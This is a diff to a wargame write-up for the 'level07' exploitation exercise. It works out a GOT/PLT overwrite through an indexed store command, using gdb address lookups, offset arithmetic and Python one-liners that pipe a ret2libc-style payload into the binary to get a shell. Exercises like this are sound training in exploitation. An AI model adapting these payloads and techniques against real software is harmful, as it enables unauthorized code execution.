@@ -23,7 +23,36 @@ The data we want to store using "store" needs to be put at an index that will be
 To do so we can override the address of the plt of a function
 -> stack_check_fail : 0x804a010
 -> printf : 0x804a000
+-> fgets : 0x804a00c
 
 ```
-(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + <address of command buffer + 7> + "\n" + <index diff between start of data[100] and 0x804a010>' ; cat) | ./level07
+(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "<addr of buffer command>"[::-1] + "\n" + "diff between addr of data_storage and printf plt"' ; cat) | ./level07
+(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "4294956639" + "\n" + "4160435336"' ; cat) | ./level07
 ```
+
+Address of buffer command:
+0xffffd658 = 4294956632 in decimal
+
+Address of buffer data_storage:
+
+```
+(gdb) ni 1
+0x08048659 in store_number ()
+(gdb) focus cmd
+Focus set to CMD window.
+(gdb) x/x $ebp-0x10
+0xffffd488:     0xffffd65f
+```
+
+Difference between 0xffffd488 and 0x804a000 :
+0xF7FB3488 = 4160435336 in decimal %3 = 2 GOOD
+
+<!-- Difference between 0xffffd488 and 0x804a00c : -->
+<!-- 0xF7FB35E8 = 4160435688 in decimal %3 = 0 KO -->
+
+<!-- NICE -->
+<!-- Difference between 0xffffd488 and 0x804a010: -->
+<!-- 0xF7FB35E4 = 4160435684 in decimal %3 = 2 GOOD -->
+
+TO RUN STDIN PYTHON INSIDE GDB:
+run < <(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "4294956639" + "\n" + "4160435336"')
